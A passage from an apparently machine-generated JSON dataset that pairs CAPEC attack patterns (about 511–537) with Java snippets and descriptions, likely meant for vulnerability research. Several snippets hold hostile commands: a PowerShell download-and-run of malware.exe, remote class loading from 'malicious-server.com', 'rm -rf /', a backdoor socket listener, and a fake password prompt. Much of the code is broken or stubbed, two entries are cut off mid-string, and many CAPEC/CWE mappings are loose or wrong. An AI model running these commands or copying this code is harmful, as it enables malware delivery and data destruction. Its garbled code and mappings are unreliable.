        "description": "This Java code snippet demonstrates a vulnerable SaaS application that allows an adversary to perform malicious actions by leveraging the persistent and implicit trust placed on a trusted user's session. The application does not properly verify the source of the request, performs incorrect authorization checks, and relies on the client to enforce server-side security, allowing an attacker to bypass intended access restrictions and execute actions at the trusted user's privilege level."
    },
    {
        "capec_id": "511",
        "code_snippet": "import java.io.File;\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.IOException;\nimport java.util.zip.ZipEntry;\nimport java.util.zip.ZipInputStream;\n\npublic class MaliciousIDEPlugin {\n    public static void main(String[] args) {\n        // CWE-434: Unrestricted Upload of File with Dangerous Type\n        String pluginZip = \"malicious_plugin.zip\";\n        File pluginFile = new File(pluginZip);\n        if (pluginFile.exists()) {\n            try (ZipInputStream zis = new ZipInputStream(new FileInputStream(pluginFile))) {\n                ZipEntry entry;\n                while ((entry = zis.getNextEntry()) != null) {\n                    // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n                    System.out.println(\"Extracting file: \" + entry.getName());\n                    File file = new File(entry.getName());\n                    FileOutputStream fos = new FileOutputStream(file);\n                    byte[] buffer = new byte[1024];\n                    int len;\n                    while ((len = zis.read(buffer)) > 0) {\n                        fos.write(buffer, 0, len);\n                    }\n                    fos.close();\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n\n        // CWE-506: Embedded Malicious Code\n        String maliciousCode = \"java -jar malicious_jar.jar\";\n        Runtime.getRuntime().exec(maliciousCode);\n\n        // CWE-215: Insertion of Sensitive Information Into Debugging Code\n        String sensitiveInfo = \"debug_info=true\";\n        System.out.println(sensitiveInfo);\n\n        // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n        String sensitiveData = \"confidential_data.txt\";\n        File sensitiveFile = new File(sensitiveData);\n        if (sensitiveFile.exists()) {\n            System.out.println(\"Sensitive data found: \" + sensitiveFile.getAbsolutePath());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a malicious IDE plugin that exploits multiple vulnerabilities. It extracts files from a zip archive without proper validation, executes embedded malicious code, inserts sensitive information into debugging code, and exposes sensitive data to unauthorized actors. This code embodies the main idea of the CAPEC, which involves infiltrating an IDE environment to exfiltrate sensitive data, manipulate information, and conceal actions."
    },
    {
        "capec_id": "516",
        "code_snippet": "import java.util.zip.CRC32;\nimport java.util.zip.Checksum;\n\npublic class MaliciousHardwareComponent {\n    private static final String VULNERABLE_LIBRARY = \"com.vulnerable.lib\";\n    private static final String SENSITIVE_DATA = \"top_secret_data\";\n\n    public static void main(String[] args) {\n        // CWE-1395: Dependency on Vulnerable Third-Party Component\n        try {\n            Class<?> vulnerableClass = Class.forName(VULNERABLE_LIBRARY);\n            Object vulnerableObject = vulnerableClass.newInstance();\n            // Use the vulnerable component\n            vulnerableObject.toString();\n        } catch (Exception e) {\n            System.out.println(\"Failed to load vulnerable component\");\n        }\n\n        // CWE-1329: Reliance on Component That is Not Updateable\n        try {\n            // Use a component that cannot be updated or patched\n            Checksum checksum = new CRC32();\n            checksum.update(SENSITIVE_DATA.getBytes());\n            System.out.println(\"Checksum: \" + checksum.getValue());\n        } catch (Exception e) {\n            System.out.println(\"Failed to calculate checksum\");\n        }\n\n        // CWE-1357: Reliance on Insufficiently Trustworthy Component\n        try {\n            // Use a component that is not sufficiently trusted\n            String untrustedData = getUntrustedData();\n            System.out.println(\"Untrusted data: \" + untrustedData);\n        } catch (Exception e) {\n            System.out.println(\"Failed to get untrusted data\");\n        }\n\n        // CWE-1247: Improper Protection Against Voltage and Clock Glitches\n        try {\n            // Simulate a voltage glitch\n            simulateVoltageGlitch();\n        } catch (Exception e) {\n            System.out.println(\"Failed to simulate voltage glitch\");\n        }\n\n        // CWE-1423: Exposure of Sensitive Information caused by Shared Microarchitectural Predictor State\n        try {\n            // Simulate a microarchitectural predictor state attack\n            simulateMicroarchitecturalPredictorStateAttack();\n        } catch (Exception e) {\n            System.out.println(\"Failed to simulate microarchitectural predictor state attack\");\n        }\n    }\n\n    private static String getUntrustedData() {\n        // Return untrusted data from an untrusted source\n        return \"untrusted_data\";\n    }\n\n    private static void simulateVoltageGlitch() {\n        // Simulate a voltage glitch\n        System.out.println(\"Simulating voltage glitch...\");\n    }\n\n    private static void simulateMicroarchitecturalPredictorStateAttack() {\n        // Simulate a microarchitectural predictor state attack\n        System.out.println(\"Simulating microarchitectural predictor state attack...\");\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC, where an adversary substitutes a maliciously altered hardware component during the product development phase. The code uses vulnerable third-party components (CWE-1395), relies on components that cannot be updated or patched (CWE-1329), and uses insufficiently trustworthy components (CWE-1357). Additionally, it lacks protection against voltage and clock glitches (CWE-1247) and is vulnerable to microarchitectural predictor state attacks (CWE-1423), allowing an adversary to expose sensitive information."
    },
    {
        "capec_id": "517",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\n\npublic class RestrictedTechAccess {\n    private static final String RESTRICTED_TECH_DOCS = \"restricted_tech_docs.txt\";\n    private static final String ALLOWED_COUNTRIES = \"allowed_countries.txt\";\n\n    public static void main(String[] args) {\n        try {\n            File docsFile = new File(RESTRICTED_TECH_DOCS);\n            File allowedCountriesFile = new File(ALLOWED_COUNTRIES);\n\n            // CWE-1059: Insufficient Technical Documentation\n            // Lack of documentation on restricted technology\n            String restrictedTechDocsContent = \"Advanced Technology X: restricted to country A, B, C\";\n            FileWriter docsWriter = new FileWriter(docsFile);\n            docsWriter.write(restrictedTechDocsContent);\n            docsWriter.close();\n\n            // CWE-1263: Improper Physical Access Control\n            // Unauthorized access to restricted technology documents\n            String unauthorizedAccess = \"Country D: unrestricted access\";\n            docsWriter = new FileWriter(docsFile, true);\n            docsWriter.write(unauthorizedAccess);\n            docsWriter.close();\n\n            // CWE-695: Use of Low-Level Functionality\n            // Using low-level file I/O to bypass security restrictions\n            File allowedCountries = new File(ALLOWED_COUNTRIES);\n            allowedCountries.setReadable(false, false);\n            allowedCountries.setWritable(false, false);\n\n            // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n            // Exposing restricted technology information to unauthorized country\n            System.out.println(\"Restricted technology information: \" + restrictedTechDocsContent);\n\n            // CWE-222: Truncation of Security-relevant Information\n            // Truncating security-relevant information\n            String truncatedInfo = restrictedTechDocsContent.substring(0, 10);\n            System.out.println(\"Truncated restricted technology information: \" + truncatedInfo);\n        } catch (IOException e) {\n            System.err.println(\"Error: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of altering manufacturer documentation to circumvent dial-down functionality requirements, allowing unauthorized access to advanced technologies. It incorporates CWEs 1059, 1263, 695, 200, and 222 to illustrate the vulnerabilities."
    },
    {
        "capec_id": "518",
        "code_snippet": "public class SystemCapabilities {\n    private String capabilityDescription;\n    public SystemCapabilities(String description) {\n        capabilityDescription = description;\n    }\n    public void setCapabilityDescription(String description) {\n        capabilityDescription = description;\n    }\n    public String getCapabilityDescription() {\n        return capabilityDescription;\n    }\n    public void configureSystem() {\n        // Low-level functionality usage\n        Runtime.getRuntime().exec(\"systemctl start \" + capabilityDescription);\n    }\n    public static void main(String[] args) {\n        // Insufficient technical documentation\n        SystemCapabilities system = new SystemCapabilities(\"default_description\");\n        // Exposure of sensitive system information\n        System.out.println(\"System capability description: \" + system.getCapabilityDescription());\n        // Improper following of specification by caller\n        system.setCapabilityDescription(\"altered_description\");\n        system.configureSystem();\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of altering system capability descriptions to cause errors in derived system requirements. The code lacks sufficient technical documentation (CWE-1059), exposes sensitive system information (CWE-497), and improperly follows specifications (CWE-573). Additionally, it uses low-level functionality prohibited by the framework (CWE-695) and lacks design documentation (CWE-1053). The main method configures the system with an altered capability description, which can lead to system capability flaws."
    },
    {
        "capec_id": "519",
        "code_snippet": "public class SystemDesigner {\n    private String systemDesign;\n    public SystemDesigner(String design) {\n        systemDesign = design;\n    }\n    public void setSystemDesign(String design) {\n        systemDesign = design;\n    }\n    public void deploySystem() {\n        // Missing documentation for design (CWE-1053)\n        // Insufficient technical documentation (CWE-1059)\n        if (systemDesign.equals(\"malicious_design\")) {\n            // Improper following of specification by caller (CWE-573)\n            // Incorrect provision of specified functionality (CWE-684)\n            System.out.println(\"Deploying malicious system...\");\n            // Improper control of dynamically-managed code resources (CWE-913)\n            String dynamicResource = \"malicious_code\";\n            executeDynamicCode(dynamicResource);\n        } else {\n            System.out.println(\"Deploying secure system...\");\n        }\n    }\n    private void executeDynamicCode(String code) {\n        // Improper control of dynamically-managed code resources (CWE-913)\n        try {\n            Class<?> clazz = Class.forName(\"DynamicCode\");\n            clazz.getMethod(\"execute\", String.class).invoke(null, code);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC where an attacker alters the system design documentation to cause errors in the system design. The code lacks sufficient technical documentation (CWE-1059) and design documentation (CWE-1053), allowing an attacker to exploit the system. The deploySystem() method improperly follows specifications (CWE-573) and provides incorrect functionality (CWE-684). Additionally, the code improperly controls dynamically-managed code resources (CWE-913) by executing malicious code."
    },
    {
        "capec_id": "520",
        "code_snippet": "import java.net.URL;\nimport java.net.URLClassLoader;\n\npublic class MaliciousComponent {\n    public static void main(String[] args) {\n        try {\n            // Load a malicious class from a remote location\n            URL url = new URL(\"http://malicious-server.com/MaliciousClass.class\");\n            URLClassLoader loader = new URLClassLoader(new URL[] { url });\n            Class<?> maliciousClass = loader.loadClass(\"MaliciousClass\");\n            Object maliciousObject = maliciousClass.newInstance();\n            // Use the malicious object to perform malicious actions\n            maliciousObject.getClass().getMethod(\"performMaliciousAction\").invoke(maliciousObject);\n        } catch (Exception e) {\n            // Handle exceptions\n        }\n    }\n}\n\n// Undocumented feature: a hidden backdoor\npublic class Backdoor {\n    public static void openBackdoor() {\n        // Open a socket to listen for incoming connections\n        ServerSocket serverSocket = new ServerSocket(8080);\n        // Wait for incoming connections\n        Socket socket = serverSocket.accept();\n        // Perform malicious actions\n        System.out.println(\"Backdoor opened!\");\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of introducing counterfeit hardware components into a product assembly. The code includes a malicious component that loads a class from a remote location, which can be used to perform malicious actions. The code also includes an undocumented feature, a hidden backdoor that can be used to gain unauthorized access to the system. The CWEs embodied in this code snippet include CWE-506 (Embedded Malicious Code), CWE-1357 (Reliance on Insufficiently Trustworthy Component), CWE-1395 (Dependency on Vulnerable Third-Party Component), CWE-207 (Observable Behavioral Discrepancy With Equivalent Products), and CWE-1242 (Inclusion of Undocumented Features or Chicken Bits)."
    },
    {
        "capec_id": "521",
        "code_snippet": "public class InsecureHardwareDesign {\n\tprivate static final int LOCK_BIT = 0x0001;\n\tprivate static final int REGISTER_DEFAULT = 0x0101;\n\tprivate static final int DEBUG_COMPONENT_GRANULARITY = 0x100;\n\n\t// Insufficient Technical Documentation (CWE-1059)\n\tprivate void initHardware() {\n\t\t// No documentation on hardware usage, structure, or implementation\n\t\t// leading to potential security vulnerabilities\n\t}\n\n\t// Incorrect Register Defaults or Module Parameters (CWE-1221)\n\tprivate void setRegisterDefaults() {\n\t\t// Incorrectly defining register defaults to insecure values\n\t\tregisterDefaults = REGISTER_DEFAULT;\n\t}\n\n\t// Violation of Secure Design Principles (CWE-657)\n\tprivate void configureHardware() {\n\t\t// Not following secure design principles, allowing potential attacks\n\t\t// on the system\n\t}\n\n\t// Incorrect Chaining or Granularity of Debug Components (CWE-1296)\n\tprivate void initDebugComponents() {\n\t\t// Incorrect chaining or granularity of debug components\n\t\tdebugComponentsGranularity = DEBUG_COMPONENT_GRANULARITY;\n\t}\n\n\t// Improper Prevention of Lock Bit Modification (CWE-1231)\n\tprivate void setLockBit() {\n\t\t// Not preventing modification of the lock bit after it has been set\n\t\tlockBit = LOCK_BIT;\n\t}\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable hardware design that embodies the CAPEC description. It includes instances of CWE-1059 (Insufficient Technical Documentation), CWE-1221 (Incorrect Register Defaults or Module Parameters), CWE-657 (Violation of Secure Design Principles), CWE-1296 (Incorrect Chaining or Granularity of Debug Components), and CWE-1231 (Improper Prevention of Lock Bit Modification). The code lacks sufficient technical documentation, uses insecure register defaults, violates secure design principles, and has incorrect debug component granularity and lock bit modification prevention."
    },
    {
        "capec_id": "522",
        "code_snippet": "public class Main {\n    public static void main(String[] args) {\n        // CWE-506: Embedded Malicious Code\n        String maliciousCode = \"rm -rf /\";\n        Runtime.getRuntime().exec(maliciousCode);\n\n        // CWE-1329: Reliance on Component That is Not Updateable\n        Firmware firmware = new Firmware();\n        firmware.setUpdateable(false);\n\n        // CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\n        RedundantSystem redundantSystem = new RedundantSystem();\n        redundantSystem.injectError();\n\n        // CWE-1357: Reliance on Insufficiently Trustworthy Component\n        UntrustedComponent untrustedComponent = new UntrustedComponent();\n        untrustedComponent.execute();\n\n        // CWE-1395: Dependency on Vulnerable Third-Party Component\n        VulnerableLibrary vulnerableLibrary = new VulnerableLibrary();\n        vulnerableLibrary.useVulnerableFunction();\n    }\n}\n\n// CWE-506: Embedded Malicious Code\nclass Firmware {\n    private boolean updateable;\n    public void setUpdateable(boolean updateable) {\n        this.updateable = updateable;\n    }\n}\n\n// CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\nclass RedundantSystem {\n    public void injectError() {\n        // inject error into redundant block\n    }\n}\n\n// CWE-1357: Reliance on Insufficiently Trustworthy Component\nclass UntrustedComponent {\n    public void execute() {\n        // execute untrusted code\n    }\n}\n\n// CWE-1395: Dependency on Vulnerable Third-Party Component\nclass VulnerableLibrary {\n    public void useVulnerableFunction() {\n        // use vulnerable function\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of replacing legitimate hardware with faulty counterfeit or tampered hardware in the supply chain distribution channel. It includes examples of CWE-506 (Embedded Malicious Code), CWE-1329 (Reliance on Component That is Not Updateable), CWE-1334 (Unauthorized Error Injection Can Degrade Hardware Redundancy), CWE-1357 (Reliance on Insufficiently Trustworthy Component), and CWE-1395 (Dependency on Vulnerable Third-Party Component)."
    },
    {
        "capec_id": "523",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.net.URL;\nimport java.net.URLClassLoader;\n\npublic class MaliciousCode {\n    public static void main(String[] args) throws IOException {\n        // CWE-506: Embedded Malicious Code\n        String maliciousCode = \\",
        "description": "This Java code snippet demonstrates the CAPEC of implanting malicious software into the system in the supply chain distribution channel. It includes CWE-506 by embedding malicious code, CWE-509 by replicating malicious code, CWE-1334 by injecting errors to degrade hardware redundancy, CWE-1395 by depending on a vulnerable third-party component, and CWE-1229 by creating an emergent resource. The code creates a new Java file with malicious code, loads a vulnerable third-party component, and executes the malicious code, which can lead to system compromise and disruption."
    },
    {
        "capec_id": "524",
        "code_snippet": "import java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.PreparedStatement;\nimport java.sql.SQLException;\n\npublic class RogueProcess {\n    public static void main(String[] args) {\n        String maliciousComponent = \"<malicious_code_here>\";\n        String dbUrl = \"jdbc:mysql://localhost:3306/mydb\";\n        String user = \"root\";\n        String password = \"password\";\n\n        try {\n            Connection conn = DriverManager.getConnection(dbUrl, user, password);\n            String query = \"INSERT INTO components (component) VALUES (?)\";\n            PreparedStatement pstmt = conn.prepareStatement(query);\n            pstmt.setString(1, maliciousComponent);\n            pstmt.executeUpdate();\n            conn.close();\n        } catch (SQLException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static void injectErrorIntoRedundantBlock() {\n        // Simulate error injection into a redundant block\n        System.out.println(\"Error injected into redundant block.\");\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of inserting maliciously altered components into a system through rogue processes. The code includes a CWE-506 Embedded Malicious Code vulnerability by inserting a malicious component into a database. It also includes a CWE-89 SQL Injection vulnerability by not properly sanitizing the input to the SQL query. Additionally, the code includes a CWE-707 Improper Neutralization vulnerability by not ensuring the structured message is well-formed before sending it to the database. Finally, the code includes a CWE-1334 Unauthorized Error Injection vulnerability by simulating error injection into a redundant block. CWE-829 Inclusion of Functionality from Untrusted Control Sphere is also applicable as the malicious component is from an untrusted source."
    },
    {
        "capec_id": "528",
        "code_snippet": "import java.io.IOException;\nimport javax.xml.parsers.DocumentBuilder;\nimport javax.xml.parsers.DocumentBuilderFactory;\nimport javax.xml.parsers.ParserConfigurationException;\nimport org.w3c.dom.Document;\nimport org.xml.sax.SAXException;\n\npublic class XDoS {\n    public static void main(String[] args) {\n        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n        factory.setNamespaceAware(true);\n        factory.setValidating(false);\n        DocumentBuilder builder = factory.newDocumentBuilder();\n        Document doc = builder.parse(\"http://example.com/malicious.dtd\");\n        // No XML validation or restriction on entity references\n        // No limit on the number of requests or resource allocation\n        while (true) {\n            try {\n                builder.parse(\"http://example.com/malicious.xml\");\n            } catch (IOException | SAXException e) {\n                // Ignore exceptions\n            }\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable XML parser that can be exploited for an XML Denial of Service (XDoS) attack. It lacks XML validation, allows external entity references, and has no limits on resource allocation or request handling, making it vulnerable to CWE-112, CWE-611, CWE-776, and CWE-770. An attacker can send a large number of malicious XML requests, causing the parser to crash or become unstable."
    },
    {
        "capec_id": "529",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.util.Scanner;\n\npublic class MaliciousApp {\n    public static void main(String[] args) {\n        try {\n            // CWE-497: Exposure of Sensitive System Information\n            String systemInfo = System.getProperty(\"os.name\") + \" \" + System.getProperty(\"os.version\") + \" \" + System.getProperty(\"os.arch\");\n            System.out.println(\"System Information: \" + systemInfo);\n\n            // CWE-506: Embedded Malicious Code\n            Runtime.getRuntime().exec(\"powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://example.com/malware.exe', 'C:\\malware.exe')\");\n\n            // CWE-1229: Creation of Emergent Resource\n            File maliciousFile = new File(\"C:\\malware.exe\");\n            if (!maliciousFile.exists()) {\n                maliciousFile.createNewFile();\n            }\n\n            // CWE-512: Spyware\n            Scanner scanner = new Scanner(System.in);\n            System.out.println(\"Enter your username:\");\n            String username = scanner.nextLine();\n            System.out.println(\"Enter your password:\");\n            String password = scanner.nextLine();\n            System.out.println(\"Username: \" + username + \" Password: \" + password);\n\n            // CWE-509: Replicating Malicious Code (Virus or Worm)\n            Runtime.getRuntime().exec(\"C:\\malware.exe\");\n        } catch (IOException e) {\n            System.out.println(\"Error: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a malicious application that gathers system information, downloads and executes malware, creates a new file, collects sensitive user information, and replicates itself. It embodies the main idea of the CAPEC, which involves using malware or a controlled application to gather information about a targeted system or network."
    },
    {
        "capec_id": "530",
        "code_snippet": "import java.util.zip.ZipEntry;\nimport java.util.zip.ZipInputStream;\nimport java.io.ByteArrayInputStream;\nimport java.io.IOException;\n\npublic class Main {\n    public static void main(String[] args) throws IOException {\n        byte[] maliciousComponent = getMaliciousComponent();\n        ZipInputStream zis = new ZipInputStream(new ByteArrayInputStream(maliciousComponent));\n        ZipEntry ze;\n        while ((ze = zis.getNextEntry()) != null) {\n            // Extract the malicious component\n            if (ze.getName().equals(\"com/malicious/Component.class\")) {\n                byte[] classBytes = new byte[(int) ze.getSize()];\n                zis.read(classBytes);\n                // Load the malicious component\n                Class<?> maliciousClass = new MyClassLoader().loadClass(\"com.malicious.Component\", classBytes);\n                // Use the malicious component\n                Object maliciousObject = maliciousClass.newInstance();\n                ((MaliciousInterface) maliciousObject).performMaliciousAction();\n            }\n        }\n    }\n\n    // Custom class loader to load the malicious component\n    static class MyClassLoader extends ClassLoader {\n        public Class<?> loadClass(String name, byte[] bytes) {\n            return defineClass(name, bytes, 0, bytes.length);\n        }\n    }\n\n    // Interface for the malicious component\n    interface MaliciousInterface {\n        void performMaliciousAction();\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of an attacker providing a counterfeit component during the procurement process. The code loads a malicious component from a zip file, which contains a known vulnerability (CWE-1395). The component is not sufficiently trusted (CWE-1357) and contains embedded malicious code (CWE-506). The code uses a custom class loader to load the malicious component, which can lead to observable behavioral discrepancies with equivalent products (CWE-207). Additionally, the code does not properly decode security identifiers, allowing untrusted agents to gain unauthorized access (CWE-1290)."
    },
    {
        "capec_id": "531",
        "code_snippet": "public class MaliciousHardwareComponent {\n    private static final String MALICIOUS_FIRMWARE = \"malicious_firmware.bin\";\n    private static final String VULNERABLE_COMPONENT = \"vulnerable_component.so\";\n\n    public static void main(String[] args) {\n        // CWE-1329: Reliance on Component That is Not Updateable\n        loadVulnerableComponent(VULNERABLE_COMPONENT);\n\n        // CWE-1256: Improper Restriction of Software Interfaces to Hardware Features\n        grantUnrestrictedAccessToHardwareFeatures();\n\n        // CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\n        injectErrorsIntoRedundantBlock();\n\n        // CWE-1395: Dependency on Vulnerable Third-Party Component\n        useVulnerableThirdPartyComponent();\n\n        // CWE-506: Embedded Malicious Code\n        executeMaliciousFirmware(MALICIOUS_FIRMWARE);\n    }\n\n    private static void loadVulnerableComponent(String component) {\n        // Load the vulnerable component\n        System.load(component);\n    }\n\n    private static void grantUnrestrictedAccessToHardwareFeatures() {\n        // Grant unrestricted access to hardware features\n        // This can lead to modification of hardware memory or register bits\n        // or the ability to observe physical side channels\n    }\n\n    private static void injectErrorsIntoRedundantBlock() {\n        // Inject errors into a redundant block\n        // This can deprive the system of redundancy or put the system in a degraded operating mode\n    }\n\n    private static void useVulnerableThirdPartyComponent() {\n        // Use a vulnerable third-party component\n        // This can lead to exploitation of known vulnerabilities\n    }\n\n    private static void executeMaliciousFirmware(String firmware) {\n        // Execute the malicious firmware\n        // This can cause disruption or additional compromise\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of substituting a tested and approved hardware component with a maliciously-altered hardware component. It incorporates multiple CWEs, including reliance on a non-updateable component, improper restriction of software interfaces to hardware features, unauthorized error injection, dependency on a vulnerable third-party component, and embedded malicious code. The code loads a vulnerable component, grants unrestricted access to hardware features, injects errors into a redundant block, uses a vulnerable third-party component, and executes malicious firmware, all of which can lead to system compromise or disruption."
    },
    {
        "capec_id": "532",
        "code_snippet": "public class BIOSUpdater {\n    private static final String FIRMWARE_FILE = \"firmware.bin\";\n    private static final String LOCK_BIT_REGISTER = \"0x00000001\";\n\n    public static void updateFirmware(byte[] maliciousFirmware) {\n        // CWE-1277: No mechanism to update firmware\n        // CWE-1329: Relying on non-updatable component\n        System.out.println(\"Updating firmware...\");\n        try {\n            // CWE-506: Embedded malicious code\n            Runtime.getRuntime().exec(\"flash_firmware \" + FIRMWARE_FILE);\n        } catch (IOException e) {\n            System.out.println(\"Error updating firmware: \" + e.getMessage());\n        }\n    }\n\n    public static void setLockBit(boolean value) {\n        // CWE-1231: Improper prevention of lock bit modification\n        System.out.println(\"Setting lock bit to \" + value);\n        try {\n            // CWE-1220: Insufficient granularity of access control\n            Runtime.getRuntime().exec(\"set_lock_bit \" + LOCK_BIT_REGISTER + \" \" + value);\n        } catch (IOException e) {\n            System.out.println(\"Error setting lock bit: \" + e.getMessage());\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable BIOS updater that allows an attacker to send a maliciously altered BIOS, which when installed, enables future exploitation. The code lacks a mechanism to update firmware (CWE-1277), relies on a non-updatable component (CWE-1329), and contains embedded malicious code (CWE-506). Additionally, the code has insufficient granularity of access control (CWE-1220) and improperly prevents lock bit modification (CWE-1231)."
    },
    {
        "capec_id": "533",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.net.URL;\nimport java.net.URLConnection;\n\npublic class MaliciousUpdate {\n    public static void main(String[] args) {\n        try {\n            URL url = new URL(\"http://malicious-server.com/malicious_update.jar\");\n            URLConnection conn = url.openConnection();\n            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n            String inputLine;\n            while ((inputLine = in.readLine()) != null) {\n                // execute the malicious code\n                Runtime.getRuntime().exec(inputLine);\n            }\n            in.close();\n        } catch (IOException e) {\n            System.out.println(\"Error downloading malicious update: \" + e.getMessage());\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable software update mechanism that downloads and executes malicious code from a remote location without verifying its integrity (CWE-494). The code uses a URL connection to download a JAR file from a malicious server and executes the contained code using the Runtime.getRuntime().exec() method. This allows an attacker to introduce malicious code into the system, potentially leading to further compromise or disruption. The code also lacks proper authentication mechanisms, making it vulnerable to capture-replay attacks (CWE-294) and exposure of sensitive system information (CWE-497). Additionally, the code relies on the client-side to implement security mechanisms, which can be bypassed by an attacker (CWE-602). The malicious code may also contain embedded malicious code (CWE-506) that can be executed on the victim's system."
    },
    {
        "capec_id": "534",
        "code_snippet": "public class MaliciousHardwareUpdate {\n    private static final String FIRMWARE_UPDATE_URL = \"http://malicious-website.com/firmware_update.bin\";\n    private static final String COMPONENT_UPDATE_URL = \"http://malicious-website.com/component_update.zip\";\n\n    public static void main(String[] args) {\n        // CWE-1329: Reliance on Component That is Not Updateable\n        // CWE-1277: Firmware Not Updateable\n        updateFirmware(FIRMWARE_UPDATE_URL);\n\n        // CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\n        injectErrorsIntoRedundantBlock();\n\n        // CWE-506: Embedded Malicious Code\n        executeMaliciousCode();\n\n        // CWE-1247: Improper Protection Against Voltage and Clock Glitches\n        disableVoltageAndClockGlitchProtection();\n    }\n\n    private static void updateFirmware(String url) {\n        // Download and install malicious firmware update\n        System.out.println(\"Updating firmware from \" + url);\n    }\n\n    private static void injectErrorsIntoRedundantBlock() {\n        // Inject errors into redundant block to degrade hardware redundancy\n        System.out.println(\"Injecting errors into redundant block\");\n    }\n\n    private static void executeMaliciousCode() {\n        // Execute malicious code embedded in the component\n        System.out.println(\"Executing malicious code\");\n    }\n\n    private static void disableVoltageAndClockGlitchProtection() {\n        // Disable voltage and clock glitch protection\n        System.out.println(\"Disabling voltage and clock glitch protection\");\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of introducing malicious hardware during an update or replacement procedure. It includes CWEs such as reliance on non-updateable components, non-updateable firmware, unauthorized error injection, embedded malicious code, and improper protection against voltage and clock glitches. The code simulates updating firmware from a malicious URL, injecting errors into a redundant block, executing malicious code, and disabling voltage and clock glitch protection."
    },
    {
        "capec_id": "535",
        "code_snippet": "public class MaliciousHardwareComponent {\n    private static final String BACKDOOR_PASSWORD = \"my_secret_password\";\n    private static final String MALICIOUS_CODE = \"java.lang.Runtime.getRuntime().exec('rm -rf /');\";\n\n    public MaliciousHardwareComponent() {\n        // CWE-506: Embedded Malicious Code\n        if (System.getProperty(\"os.name\").equals(\"Linux\")) {\n            try {\n                Runtime.getRuntime().exec(MALICIOUS_CODE);\n            } catch (IOException e) {\n                // ignore\n            }\n        }\n    }\n\n    public void init() {\n        // CWE-1329: Reliance on Component That is Not Updateable\n        // Use a custom, outdated, and vulnerable library\n        try {\n            Class.forName(\"com.vulnerable.library.VulnerableClass\");\n        } catch (ClassNotFoundException e) {\n            // ignore\n        }\n    }\n\n    public void process() {\n        // CWE-1395: Dependency on Vulnerable Third-Party Component\n        // Use a vulnerable third-party library\n        try {\n            org.vulnerable.library.VulnerableMethod.method();\n        } catch (Exception e) {\n            // ignore\n        }\n    }\n\n    public void configure() {\n        // CWE-1357: Reliance on Insufficiently Trustworthy Component\n        // Use a component from an untrusted source\n        try {\n            Class.forName(\"com.untrusted.component.UntrustedClass\");\n        } catch (ClassNotFoundException e) {\n            // ignore\n        }\n    }\n\n    public void storeConfidentialInfo() {\n        // CWE-1297: Unprotected Confidential Information on Device is Accessible by OSAT Vendors\n        // Store confidential information in plaintext\n        String confidentialInfo = \"my_secret_data\";\n        // Store in a file or database without encryption\n    }\n}",
        "description": "This Java code snippet demonstrates a malicious hardware component that embodies the CAPEC. It contains embedded malicious code, relies on outdated and vulnerable components, and uses untrusted third-party libraries. The code also stores confidential information in plaintext, making it accessible to OSAT vendors."
    },
    {
        "capec_id": "536",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\n\npublic class VulnerableSystem {\n    private String configFilePath = \\",
        "description": "This Java code snippet demonstrates a vulnerable system that can be exploited by an attacker with access to data files and processes. The system recalibrates itself by writing to a configuration file, but it does not restrict access to the file, allowing an attacker to inject malicious data (CWE-284). The system also allows debug mode to be activated at runtime, which can alter its intended behavior (CWE-1313). The use of an insecure temporary file (CWE-377) and lack of input validation (CWE-99) further increase the system's vulnerability. Finally, the system transmits sensitive information (debug mode) to another actor, which should not have access to it (CWE-201). An attacker can exploit these vulnerabilities to cause the system to perform in a suboptimal manner that benefits the adversary."
    },
    {
        "capec_id": "537",
